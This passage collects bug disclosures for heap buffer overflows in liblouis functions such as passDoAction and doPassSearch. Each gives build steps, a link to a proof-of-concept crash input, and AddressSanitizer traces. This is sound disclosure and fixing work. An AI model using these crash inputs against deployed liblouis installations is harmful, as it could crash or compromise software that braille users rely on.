    #3 0x5607fcabdb44 in lou_backTranslate build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:153:9
    #4 0x5607fcabd9b6 in lou_backTranslateString build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:145:9
    #5 0x5607fca7fcd3 in LLVMFuzzerTestOneInput ossfuzz/./fuzz_backtranslate.c:110:3
    #6 0x5607fc98ccd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (ossfuzz/fuzz_backtranslate+0x65cd4) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)
    #7 0x5607fc975e06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (ossfuzz/fuzz_backtranslate+0x4ee06) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)
    #8 0x5607fc97b8ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (ossfuzz/fuzz_backtranslate+0x548ba) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)
    #9 0x5607fc9a6076 in main (ossfuzz/fuzz_backtranslate+0x7f076) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)
    #10 0x7f4f52c2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #11 0x7f4f52c2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #12 0x5607fc9709d4 in _start (ossfuzz/fuzz_backtranslate+0x499d4) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)

0x5210000050fc is located 4 bytes before 4112-byte region [0x521000005100,0x521000006110)
allocated by thread T0 here:
    #0 0x5607fca40e03 in malloc (ossfuzz/fuzz_backtranslate+0x119e03) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)
    #1 0x5607fca8ac54 in _lou_allocMem build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:5301:18
    #2 0x5607fcabedac in _lou_backTranslate build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:233:23
    #3 0x5607fcabdb44 in lou_backTranslate build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:153:9
    #4 0x5607fcabd9b6 in lou_backTranslateString build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:145:9
    #5 0x5607fca7fcd3 in LLVMFuzzerTestOneInput ossfuzz/./fuzz_backtranslate.c:110:3
    #6 0x5607fc98ccd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (ossfuzz/fuzz_backtranslate+0x65cd4) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)
    #7 0x5607fc975e06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (ossfuzz/fuzz_backtranslate+0x4ee06) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)
    #8 0x5607fc97b8ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (ossfuzz/fuzz_backtranslate+0x548ba) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)
    #9 0x5607fc9a6076 in main (ossfuzz/fuzz_backtranslate+0x7f076) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)
    #10 0x7f4f52c2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #11 0x7f4f52c2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #12 0x5607fc9709d4 in _start (ossfuzz/fuzz_backtranslate+0x499d4) (BuildId: 7566fceff8f3379fe705840dc0566283182b2862)

SUMMARY: AddressSanitizer: heap-buffer-overflow build_asan/liblouis/../../code/liblouis/lou_backTranslateString.c:1542:17 in back_passDoAction
Shadow bytes around the buggy address:
  0x521000004e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x521000004e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x521000004f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x521000004f80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x521000005000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x521000005080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fa]
  0x521000005100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x521000005180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x521000005200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x521000005280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x521000005300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1093132==ABORTING
(afgenllm)
```

# poc-API-3d95765-passDoAction-HBO
Heap buffer overflow in `passDoAction()`

## Reference
https://github.com/liblouis/liblouis/issues/1720

## Summary
There is a heap buffer overflow problem in `passDoAction()` at liblouis/lou_translateString.c:1006 when run `fuzz_translate_generic`

https://github.com/liblouis/liblouis/blob/798304bfb1a05ff88465297d6df03bd7d7ed0d9f/liblouis/lou_translateString.c#L1003-L1007

`destStartMatch + count` and `destStartReplace + count` exceed `output->maxlength`, causing the overflow.

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 3d95765)

## How to trigger
1. Compile liblouis with AddressSanitizer
    ```bash
    $ ./autogen.sh
    $ mkdir build_asan
    $ CC="clang -fsanitize=address,fuzzer-no-link -g " ../configure --prefix=$(pwd)/../bin_asan
    $ make -j && make install
    ```
2. Compile the fuzz driver, the fuzz driver code is in `tests/fuzzing/fuzz_translate_generic.c`.
    The compile command is:
    ```bash
    $ clang ./fuzz_translate_generic.c -o ./fuzz_translate_generic -fsanitize=fuzzer,address,undefined -g -I ./build_asan/liblouis -I ../liblouis ./bin_asan/lib/liblouis.a -lyaml
    ```
3. Download the [poc file](https://github.com/Marsman1996/pocs/raw/refs/heads/master/liblouis/poc-API-3d95765-passDoAction-HBO) and run the compiled driver: `$ ./fuzz_translate_generic ./poc-API-3d95765-passDoAction-HBO`

## ASAN Report
```
$ ./ossfuzz/fuzz_translate_generic ./poc-API-3d95765-passDoAction-HBO
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 3776294924
INFO: Loaded 1 modules   (4658 inline 8-bit counters): 4658 [0x55b2e7a1d368, 0x55b2e7a1e59a), 
INFO: Loaded 1 PC tables (4658 PCs): 4658 [0x55b2e7a1e5a0,0x55b2e7a308c0), 
./ossfuzz/fuzz_translate_generic: Running 1 inputs 1 time(s) each.
Running: ./poc-API-3d95765-passDoAction-HBO
=================================================================
==2263213==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x52500000c108 at pc 0x55b2e78d91d7 bp 0x7fff2e288df0 sp 0x7fff2e2885b0
READ of size 18 at 0x52500000c108 thread T0
    #0 0x55b2e78d91d6 in __asan_memmove (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x1231d6) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #1 0x55b2e796f04d in passDoAction /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1006:5
    #2 0x55b2e7965212 in translatePass /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1077:9
    #3 0x55b2e7959a29 in _lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1294:16
    #4 0x55b2e7957b44 in lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1127:9
    #5 0x55b2e79579b6 in lou_translateString /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1119:9
    #6 0x55b2e7919cd3 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/./fuzz_translate_generic.c:117:2
    #7 0x55b2e7826cd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x70cd4) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #8 0x55b2e780fe06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x59e06) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #9 0x55b2e78158ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x5f8ba) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #10 0x55b2e7840076 in main (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x8a076) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #11 0x7fa45042a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #12 0x7fa45042a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #13 0x55b2e780a9d4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x549d4) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)

0x52500000c108 is located 0 bytes after 8200-byte region [0x52500000a100,0x52500000c108)
allocated by thread T0 here:
    #0 0x55b2e78dae03 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x124e03) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #1 0x55b2e79248be in _lou_allocMem /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:5274:21
    #2 0x55b2e79693f3 in allocStringBuffer /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:62:9
    #3 0x55b2e795be96 in getStringBuffer /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:85:35
    #4 0x55b2e79594d2 in _lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1264:9
    #5 0x55b2e7957b44 in lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1127:9
    #6 0x55b2e79579b6 in lou_translateString /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1119:9
    #7 0x55b2e7919cd3 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/./fuzz_translate_generic.c:117:2
    #8 0x55b2e7826cd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x70cd4) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #9 0x55b2e780fe06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x59e06) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #10 0x55b2e78158ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x5f8ba) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #11 0x55b2e7840076 in main (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x8a076) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #12 0x7fa45042a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #13 0x7fa45042a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #14 0x55b2e780a9d4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x549d4) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x1231d6) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b) in __asan_memmove
Shadow bytes around the buggy address:
  0x52500000be80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x52500000bf00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x52500000bf80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x52500000c000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x52500000c080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x52500000c100: 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x52500000c180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x52500000c200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x52500000c280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x52500000c300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x52500000c380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2263213==ABORTING
```

# poc-API-3d95765-doPassSearch-HBO
Heap buffer overflow in `doPassSearch()`

## Reference
https://github.com/liblouis/liblouis/issues/1721

## Summary
There is a heap buffer overflow problem in `doPassSearch()` at liblouis/lou_translateString.c:670 when run `fuzz_translate_generic`

https://github.com/liblouis/liblouis/blob/798304bfb1a05ff88465297d6df03bd7d7ed0d9f/liblouis/lou_translateString.c#L668-L681

In the for loop, `*searchPos` exceeds the `input->length`, causing the overflow.

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 3d95765)

## How to trigger
1. Compile liblouis with AddressSanitizer
    ```bash
    $ ./autogen.sh
    $ mkdir build_asan
    $ CC="clang -fsanitize=address,fuzzer-no-link -g " ../configure --prefix=$(pwd)/../bin_asan
    $ make -j && make install
    ```
2. Compile the fuzz driver, the fuzz driver code is in `tests/fuzzing/fuzz_translate_generic.c`.
    The compile command is:
    ```bash
    $ clang ./fuzz_translate_generic.c -o ./fuzz_translate_generic -fsanitize=fuzzer,address,undefined -g -I ./build_asan/liblouis -I ../liblouis ./bin_asan/lib/liblouis.a -lyaml
    ```
3. Download the [poc file](https://github.com/Marsman1996/pocs/raw/refs/heads/master/liblouis/poc-API-3d95765-doPassSearch-HBO) and run the compiled driver: `$ ./fuzz_translate_generic ./poc-API-3d95765-doPassSearch-HBO`

## ASAN Report
```
$ ./ossfuzz/fuzz_translate_generic ./poc-API-3d95765-doPassSearch-HBO 
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 77422248
INFO: Loaded 1 modules   (4658 inline 8-bit counters): 4658 [0x56155928f368, 0x56155929059a), 
INFO: Loaded 1 PC tables (4658 PCs): 4658 [0x5615592905a0,0x5615592a28c0), 
./ossfuzz/fuzz_translate_generic: Running 1 inputs 1 time(s) each.
Running: ./poc-API-3d95765-doPassSearch-HBO
=================================================================
==2760979==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x51d000001288 at pc 0x5615591e4f4a bp 0x7ffc03a17270 sp 0x7ffc03a17268
READ of size 2 at 0x51d000001288 thread T0
    #0 0x5615591e4f49 in doPassSearch /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:670:11
    #1 0x5615591def87 in passDoTest /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:876:14
    #2 0x5615591db969 in findForPassRule /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:213:7
    #3 0x5615591ebd8c in passSelectRule /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1034:7
    #4 0x5615591d6f99 in translatePass /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1064:4
    #5 0x5615591cba29 in _lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1294:16
    #6 0x5615591c9b44 in lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1127:9
    #7 0x5615591c99b6 in lou_translateString /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1119:9
    #8 0x56155918bcd3 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/./fuzz_translate_generic.c:117:2
    #9 0x561559098cd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x70cd4) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #10 0x561559081e06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x59e06) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #11 0x5615590878ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x5f8ba) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #12 0x5615590b2076 in main (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x8a076) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #13 0x7f406d62a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #14 0x7f406d62a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #15 0x56155907c9d4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x549d4) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)

0x51d000001288 is located 0 bytes after 2056-byte region [0x51d000000a80,0x51d000001288)
allocated by thread T0 here:
    #0 0x56155914ce03 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x124e03) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #1 0x5615591968be in _lou_allocMem /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/compileTranslationTable.c:5274:21
    #2 0x5615591db3f3 in allocStringBuffer /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:62:9
    #3 0x5615591cde96 in getStringBuffer /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:85:35
    #4 0x5615591cb4d2 in _lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1264:9
    #5 0x5615591c9b44 in lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1127:9
    #6 0x5615591c99b6 in lou_translateString /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1119:9
    #7 0x56155918bcd3 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/./fuzz_translate_generic.c:117:2
    #8 0x561559098cd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x70cd4) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #9 0x561559081e06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x59e06) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #10 0x5615590878ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x5f8ba) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #11 0x5615590b2076 in main (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x8a076) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)
    #12 0x7f406d62a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #13 0x7f406d62a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #14 0x56155907c9d4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/latest/ossfuzz/fuzz_translate_generic+0x549d4) (BuildId: a8e03182a9d0d38f6405948c4cbb63f1f2ebdd8b)

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/yuwei/afgen/afgenllm/database/liblouis/latest/build_asan/liblouis/../../code/liblouis/lou_translateString.c:670:11 in doPassSearch
Shadow bytes around the buggy address:
  0x51d000001000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51d000001080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51d000001100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51d000001180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51d000001200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x51d000001280: 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51d000001300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51d000001380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51d000001400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x51d000001480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x51d000001500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2760979==ABORTING
```

# poc-API-2442891-doPassSearch-HBO
Heap buffer overflow in `doPassSearch()`

## Reference

## Summary
There is a heap buffer overflow problem in `doPassSearch()` at liblouis/lou_translateString.c:654 when run `fuzz_translate_generic`

https://github.com/liblouis/liblouis/blob/24428912bc57697044b0e8be8acbc8eacf25830a/liblouis/lou_translateString.c#L653-L655

In the for loop, `*searchPos` exceeds the `input->length`, causing the overflow.
The root cause is the same as issue #1721, and I checked all `*searchPos` in `doPassSearch()`, this is the last unchecked one.

## Test Environment
Ubuntu 24.04.1, 64bit  
liblouis (master, 2442891)

## How to trigger
1. Compile liblouis with AddressSanitizer
    ```bash
    $ ./autogen.sh
    $ mkdir build_asan
    $ CC="clang -fsanitize=address,fuzzer-no-link -g " ../configure --prefix=$(pwd)/../bin_asan
    $ make -j && make install
    ```
2. Compile the fuzz driver, the fuzz driver code is in `tests/fuzzing/fuzz_translate_generic.c`.
    The compile command is:
    ```bash
    $ clang ./fuzz_translate_generic.c -o ./fuzz_translate_generic -fsanitize=fuzzer,address,undefined -g -I ./build_asan/liblouis -I ../liblouis ./bin_asan/lib/liblouis.a -lyaml
    ```
3. Download the [poc file](https://github.com/Marsman1996/pocs/raw/refs/heads/master/liblouis/poc-API-2442891-doPassSearch-HBO) and run the compiled driver: `$ ./fuzz_translate_generic ./poc-API-2442891-doPassSearch-HBO`

## ASan Report
```
$ ./fuzz_translate_generic ./poc-API-2442891-doPassSearch-HBO                                            
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2868530459
INFO: Loaded 1 modules   (4662 inline 8-bit counters): 4662 [0x5600c2ae2388, 0x5600c2ae35be), 
INFO: Loaded 1 PC tables (4662 PCs): 4662 [0x5600c2ae35c0,0x5600c2af5920), 
./fuzz_translate_generic: Running 1 inputs 1 time(s) each.
Running: ./poc-API-2442891-doPassSearch-HBO
=================================================================
==292378==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x51e000002268 at pc 0x5600c2a37a12 bp 0x7ffd86c46610 sp 0x7ffd86c46608
READ of size 2 at 0x51e000002268 thread T0
    #0 0x5600c2a37a11 in doPassSearch /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:654:10
    #1 0x5600c2a32027 in passDoTest /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:877:14
    #2 0x5600c2a2ea09 in findForPassRule /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:213:7
    #3 0x5600c2a3f04c in passSelectRule /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1036:7
    #4 0x5600c2a2a039 in translatePass /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1066:4
    #5 0x5600c2a1eac9 in _lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1296:16
    #6 0x5600c2a1cbe4 in lou_translate /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1129:9
    #7 0x5600c2a1ca56 in lou_translateString /home/yuwei/afgen/afgenllm/database/liblouis/fixed/build_asan/liblouis/../../code/liblouis/lou_translateString.c:1121:9
    #8 0x5600c29decd3 in LLVMFuzzerTestOneInput /home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/./fuzz_translate_generic.c:117:2
    #9 0x5600c28ebcd4 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x70cd4) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)
    #10 0x5600c28d4e06 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x59e06) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)
    #11 0x5600c28da8ba in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x5f8ba) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)
    #12 0x5600c2905076 in main (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x8a076) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)
    #13 0x7f7a3642a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #14 0x7f7a3642a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #15 0x5600c28cf9d4 in _start (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x549d4) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)

0x51e000002268 is located 0 bytes after 2536-byte region [0x51e000001880,0x51e000002268)
allocated by thread T0 here:
    #0 0x5600c299fe03 in malloc (/home/yuwei/afgen/afgenllm/database/liblouis/fixed/ossfuzz/fuzz_translate_generic+0x124e03) (BuildId: ac39fb29705cc4a7c2640b1203fd99f24cad6c9e)
